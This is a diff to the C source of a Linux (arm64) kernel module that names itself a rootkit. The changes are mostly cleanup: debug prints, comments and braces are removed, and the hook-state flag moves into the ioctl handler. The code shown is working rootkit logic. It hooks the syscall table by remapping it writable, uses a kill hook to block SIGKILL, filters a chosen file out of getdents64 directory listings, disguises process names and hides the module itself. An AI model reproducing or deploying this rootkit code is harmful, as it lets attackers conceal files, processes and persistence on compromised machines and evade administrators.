@@ -59,8 +59,6 @@ long my_reboot(const struct pt_regs *regs)
 //sys_kill(pid_t pid, int sig)
 long my_kill(const struct pt_regs *regs)
 {
-	pr_err("intercepting kill...\n");	
-
 	if (regs->regs[1] == SIGKILL) {
 		pr_err("found SIGKILL, deny it\n");	
 		return 0;
@@ -78,8 +76,6 @@ long my_getdents64(const struct pt_regs *regs) {
 	long ret = 0;
 	long offset = 0;
 
-	pr_err("intercepting getdents64...\n");	
-
 	user_dirents = (struct linux_dirent64 __user *)regs->regs[1];
 
 	bytes_read = (*__sys_getdents64)(regs);
@@ -88,9 +84,8 @@ long my_getdents64(const struct pt_regs *regs) {
 		goto err;
 	}
 
-	if (file_to_hide.len <= 0) {
+	if (file_to_hide.len <= 0)
 		return bytes_read;
-	}
 
 	ret_bytes_read = bytes_read;
 	dirents = kmalloc(bytes_read, GFP_KERNEL);
@@ -108,16 +103,15 @@ long my_getdents64(const struct pt_regs *regs) {
 		if (strncmp(file_to_hide.name, curr->d_name, file_to_hide.len) == 0) {
 			ret_bytes_read -= curr->d_reclen;
 			memmove(curr, (void *)curr + curr->d_reclen, ret_bytes_read);
-			// XXX: we assume only one file to hide for now
+			// only one file to hide at a time
 			break;
 		}
 		offset += curr->d_reclen;
 	}
 	ret = ret_bytes_read;
 
-	if (copy_to_user(user_dirents, dirents, ret_bytes_read)) {
+	if (copy_to_user(user_dirents, dirents, ret_bytes_read))
 		ret = -EFAULT;
-	}
 
 err_free:
 	kfree(dirents);
@@ -128,10 +122,6 @@ err:
 
 static void hook_syscalls(void)
 {
-
-	if (is_hooked)
-		return;
-
 	__sys_reboot = __sys_call_table[__NR_reboot];
 	__sys_kill = __sys_call_table[__NR_kill];
 	__sys_getdents64 = __sys_call_table[__NR_getdents64];
@@ -145,15 +135,10 @@ static void hook_syscalls(void)
 	
 	(*__update_mapping_prot)(virt_to_phys((void *)__sys_call_table), (unsigned long)__sys_call_table,
 						sizeof(syscall_fn_t) * __NR_syscalls, PAGE_KERNEL_RO);
-
-	is_hooked = true;
 }
 
 static void unhook_syscalls(void)
 {
-	if (!is_hooked)
-		return;
-
 	(*__update_mapping_prot)(virt_to_phys((void *)__sys_call_table), (unsigned long)__sys_call_table,
 						sizeof(syscall_fn_t) * __NR_syscalls, PAGE_KERNEL);
 
@@ -163,8 +148,6 @@ static void unhook_syscalls(void)
 	
 	(*__update_mapping_prot)(virt_to_phys((void *)__sys_call_table), (unsigned long)__sys_call_table,
 						sizeof(syscall_fn_t) * __NR_syscalls, PAGE_KERNEL_RO);
-
-	is_hooked = false;
 }
 
 static int sanitize_req(struct masq_proc_req *req)
@@ -175,9 +158,8 @@ static int sanitize_req(struct masq_proc_req *req)
 	int len = 0;
 
 	buf = (struct masq_proc *)kmalloc(sizeof(struct masq_proc) * req->len, GFP_KERNEL);
-	if (buf == NULL) {
+	if (buf == NULL)
 		return -EFAULT;
-	}
 
 	// remove entry with strlen(new_name) > strlen(orig_name)
 	for (i = 0; i < req->len; i++) {
@@ -207,8 +189,10 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 
 		if (is_hooked) {
 			unhook_syscalls();
+			is_hooked = false;
 		} else {
 			hook_syscalls();
+			is_hooked = true;
 		}
 		break;
 	}
@@ -281,8 +265,7 @@ err_free:
 	case IOCTL_FILE_HIDE: {
 
 		struct hided_file __user *user_hided_file = argp;
-		// XXX: should we make sure the HOOK ioctl is called before?
-		// XXX: only one file at a time?
+
 		if (!is_hooked) {
 			ret = -EINVAL;
 			break;
@@ -368,12 +351,9 @@ static int __init rootkit_init(void)
 		goto err_device;
 	}
 
-	// for hiding module
 	is_hidden = false;
-	prev = THIS_MODULE->list.prev;
-
 	is_hooked = false;
-
+	prev = THIS_MODULE->list.prev;
 	file_to_hide.len = -1;
 	file_to_hide.name[0] = '\0';
 
@@ -391,8 +371,6 @@ static int __init rootkit_init(void)
 	}
     __update_mapping_prot = (void (*)(phys_addr_t, unsigned long, phys_addr_t, pgprot_t))
 							(*__kallsyms_lookup_name)("update_mapping_prot");
-	//pr_err("kallsyms_lookup_name: %#010lx\n", (unsigned long)__kallsyms_lookup_name);
-	//pr_err("sys_call_table: %#010lx\n", (unsigned long)__sys_call_table);
 
 	return 0;
 
@@ -411,19 +389,17 @@ err:
 
 static void __exit rootkit_exit(void)
 {
-	// TODO: unhook syscall
 	if (is_hooked)
 		unhook_syscalls();
 
 	pr_info("%s: removed\n", OURMODNAME);
 	cdev_del(kernel_cdev);
-	// XXX: this should be major or dev?
+
 	unregister_chrdev_region(dev, 1);
 
 	device_destroy(class, dev);
 
 	class_destroy(class);
-
 }
 
 module_init(rootkit_init);
